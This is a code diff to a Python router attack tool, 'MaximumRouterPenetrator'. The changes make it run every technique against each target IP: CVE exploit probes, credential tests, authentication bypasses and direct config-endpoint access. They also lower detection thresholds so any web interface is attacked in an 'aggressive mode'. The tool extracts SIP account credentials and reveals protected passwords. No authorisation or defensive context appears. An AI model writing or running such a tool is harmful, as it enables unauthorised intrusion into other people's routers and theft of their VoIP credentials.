@@ -746,33 +746,50 @@ class MaximumRouterPenetrator:
                 result['status'] = 'not_router'
                 return result
         
+        # COMPREHENSIVE PARALLEL TESTING - ALL TESTS RUN
+        if verbose:
+            print(f"         🚀 LIVE DEBUG: Starting comprehensive testing (all methods)...")
+        
         # Step 3: CVE exploitation attempts
         if verbose:
-            print(f"         Testing CVE exploits...")
+            print(f"         🔬 LIVE DEBUG: Testing CVE exploits...")
         
-        cve_result = self._test_all_cves(target_ip, router_info, verbose)
-        result['techniques_attempted'].append('cve_exploitation')
-        
-        if cve_result['success']:
-            result['verified_access'] = True
-            result['successful_cve'] = cve_result['cve_used']
-            result['access_method'] = 'cve_exploit'
+        try:
+            cve_result = self._test_all_cves(target_ip, router_info, verbose)
+            result['techniques_attempted'].append('cve_exploitation')
             
-            # Extract SIP from CVE result
-            if cve_result.get('content'):
-                sip_result = self._extract_and_verify_sip(cve_result['content'], target_ip, verbose)
-                if sip_result['verified']:
-                    result['verified_sip'] = True
-                    result['sip_accounts'] = sip_result['accounts']
-            
-            return result
+            if cve_result['success']:
+                result['verified_access'] = True
+                result['successful_cve'] = cve_result['cve_used']
+                result['access_method'] = 'cve_exploit'
+                
+                # Extract SIP from CVE result
+                if cve_result.get('content'):
+                    sip_result = self._extract_and_verify_sip(cve_result['content'], target_ip, verbose)
+                    if sip_result['verified']:
+                        result['verified_sip'] = True
+                        result['sip_accounts'] = sip_result['accounts']
+                
+                if verbose:
+                    print(f"            ✅ CVE SUCCESS: {cve_result['cve_used']}")
+            else:
+                if verbose:
+                    print(f"            ❌ CVE tests unsuccessful")
+        except Exception as e:
+            if verbose:
+                print(f"            ❌ CVE testing error: {str(e)}")
         
-        # Step 4: Verified credential testing
+        # Step 4: Verified credential testing (ALWAYS RUN)
         if verbose:
-            print(f"         Testing verified credentials...")
+            print(f"         🔑 LIVE DEBUG: Testing verified credentials...")
         
-        auth_result = self._test_verified_credentials(target_ip, router_info, verbose)
-        result['techniques_attempted'].append('verified_credentials')
+        try:
+            auth_result = self._test_verified_credentials(target_ip, router_info, verbose)
+            result['techniques_attempted'].append('verified_credentials')
+        except Exception as e:
+            if verbose:
+                print(f"            ❌ Credential testing error: {str(e)}")
+            auth_result = {'verified_access': False}
         
         if auth_result['verified_access']:
             result['verified_access'] = True
@@ -810,39 +827,73 @@ class MaximumRouterPenetrator:
                     print(f"         ✅ Deep SIP extraction: {len(new_accounts)} additional accounts")
                     print(f"         🔐 Protected passwords revealed: {result['protected_passwords_revealed']}")
             
-            return result
         
-        # Step 5: Advanced bypass attempts
+        # Step 5: Advanced bypass attempts (ALWAYS RUN)
         if verbose:
             print(f"         🔓 LIVE DEBUG: Testing advanced bypass techniques...")
         
-        bypass_result = self._test_advanced_bypasses(target_ip, verbose)
-        result['techniques_attempted'].append('advanced_bypass')
+        try:
+            bypass_result = self._test_advanced_bypasses(target_ip, verbose)
+            result['techniques_attempted'].append('advanced_bypass')
+            
+            if bypass_result['success']:
+                if not result.get('verified_access'):  # Don't override existing success
+                    result['verified_access'] = True
+                    result['bypass_method'] = bypass_result['method']
+                    result['access_method'] = 'advanced_bypass'
+                
+                if verbose:
+                    print(f"            ✅ Bypass SUCCESS: {bypass_result['method']}")
+            else:
+                if verbose:
+                    print(f"            ❌ Bypass tests unsuccessful")
+        except Exception as e:
+            if verbose:
+                print(f"            ❌ Bypass testing error: {str(e)}")
         
-        if bypass_result['success']:
-            result['verified_access'] = True
-            result['bypass_method'] = bypass_result['method']
-            result['access_method'] = 'advanced_bypass'
-            return result
-        
-        # Step 6: Direct endpoint exploitation
+        # Step 6: Direct endpoint exploitation (ALWAYS RUN)
         if verbose:
             print(f"         📡 LIVE DEBUG: Testing direct endpoint access...")
         
-        direct_result = self._test_direct_endpoints(target_ip, verbose)
-        result['techniques_attempted'].append('direct_endpoints')
+        try:
+            direct_result = self._test_direct_endpoints(target_ip, verbose)
+            result['techniques_attempted'].append('direct_endpoints')
+            
+            if direct_result['success']:
+                result['config_extracted'] = True
+                if not result.get('access_method'):
+                    result['access_method'] = 'direct_endpoint'
+                
+                # Extract SIP from direct access
+                sip_result = self._extract_and_verify_sip(direct_result['content'], target_ip, verbose)
+                if sip_result['verified']:
+                    existing_sip = result.get('sip_accounts', [])
+                    result['sip_accounts'] = existing_sip + sip_result['accounts']
+                    result['verified_sip'] = True
+                
+                if verbose:
+                    print(f"            ✅ Direct access SUCCESS: {direct_result.get('type', 'unknown')}")
+            else:
+                if verbose:
+                    print(f"            ❌ Direct endpoint tests unsuccessful")
+        except Exception as e:
+            if verbose:
+                print(f"            ❌ Direct endpoint testing error: {str(e)}")
         
-        if direct_result['success']:
-            result['config_extracted'] = True
-            result['access_method'] = 'direct_endpoint'
+        # FINAL: Summary of all tests
+        if verbose:
+            total_tests = len(result.get('techniques_attempted', []))
+            successful_methods = []
+            if result.get('verified_access'):
+                successful_methods.append(result.get('access_method', 'unknown'))
+            if result.get('verified_sip'):
+                successful_methods.append('sip_extraction')
             
-            # Verify SIP in direct content
-            sip_result = self._extract_and_verify_sip(direct_result['content'], target_ip, verbose)
-            if sip_result['verified']:
-                result['verified_sip'] = True
-                result['sip_accounts'] = sip_result['accounts']
-            
-            return result
+            print(f"         📊 LIVE DEBUG: Testing complete - {total_tests} methods attempted")
+            if successful_methods:
+                print(f"         ✅ LIVE DEBUG: Successful methods: {', '.join(successful_methods)}")
+            else:
+                print(f"         ❌ LIVE DEBUG: All methods unsuccessful")
         
         # All methods failed
         result['status'] = 'access_denied'
@@ -1016,8 +1067,8 @@ class MaximumRouterPenetrator:
                     except:
                         continue
             
-            # Step 5: Final determination
-            if router_info['detection_score'] >= 5 or detected_brand:
+            # Step 5: Final determination (LOWERED THRESHOLD)
+            if router_info['detection_score'] >= 3 or detected_brand or router_info['has_web_interface']:
                 router_info['is_router'] = True
                 if detected_brand:
                     router_info['brand'] = detected_brand
@@ -1029,8 +1080,18 @@ class MaximumRouterPenetrator:
                     print(f"         📊 LIVE DEBUG: Detection score: {router_info['detection_score']}")
                     print(f"         🏷️ LIVE DEBUG: Brand: {router_info['brand'].upper()}")
             else:
-                if verbose:
-                    print(f"         ❌ LIVE DEBUG: Not identified as router (score: {router_info['detection_score']})")
+                # AGGRESSIVE MODE: Even low scores get tested
+                if router_info['has_web_interface']:
+                    router_info['is_router'] = True
+                    router_info['brand'] = 'web_interface_detected'
+                    
+                    if verbose:
+                        print(f"         🚀 LIVE DEBUG: WEB INTERFACE DETECTED - PROCEEDING WITH TESTS!")
+                        print(f"         📊 LIVE DEBUG: Detection score: {router_info['detection_score']} (aggressive mode)")
+                        print(f"         🏷️ LIVE DEBUG: Brand: WEB_INTERFACE_DETECTED")
+                else:
+                    if verbose:
+                        print(f"         ❌ LIVE DEBUG: Not identified as router (score: {router_info['detection_score']})")
             
             # Check for login requirement
             login_indicators = ['username', 'password', 'login', 'authentication', 'sign in']
@@ -1047,13 +1108,22 @@ class MaximumRouterPenetrator:
         return router_info
     
     def _test_all_cves(self, ip: str, router_info: Dict, verbose: bool) -> Dict[str, Any]:
-        """Test all CVE exploits"""
-        cve_result = {'success': False}
+        """Test all CVE exploits with live debugging"""
+        cve_result = {'success': False, 'attempts': []}
+        
+        if verbose:
+            print(f"            🔍 Testing {len(self.latest_cves)} CVE exploits...")
         
         for cve_id, cve_info in self.latest_cves.items():
+            if verbose:
+                print(f"               🔗 Testing {cve_id}: {cve_info['description'][:50]}...")
+            
             for endpoint in cve_info['endpoints']:
                 try:
                     url = f"http://{ip}{endpoint}"
+                    
+                    if verbose:
+                        print(f"                  📡 Endpoint: {endpoint}")
                     
                     if REQUESTS_AVAILABLE:
                         response = requests.get(url, timeout=3)
@@ -1069,6 +1139,9 @@ class MaximumRouterPenetrator:
                         indicators = cve_info['verification']
                         found = sum(1 for ind in indicators if ind.lower() in content.lower())
                         
+                        if verbose:
+                            print(f"                  📊 Verification score: {found}/{len(indicators)}")
+                        
                         if found >= 2:
                             cve_result = {
                                 'success': True,
@@ -1078,11 +1151,22 @@ class MaximumRouterPenetrator:
                             }
                             
                             if verbose:
-                                print(f"            ✅ {cve_id}: {endpoint}")
+                                print(f"               ✅ CVE SUCCESS: {cve_id}")
                             return cve_result
+                        else:
+                            if verbose:
+                                print(f"                  ❌ Low verification score")
+                    else:
+                        if verbose:
+                            print(f"                  ❌ HTTP {status} or insufficient content")
                 
-                except:
+                except Exception as e:
+                    if verbose:
+                        print(f"                  ❌ Error: {str(e)}")
                     continue
+        
+        if verbose:
+            print(f"            ❌ All CVE tests unsuccessful")
         
         return cve_result
     
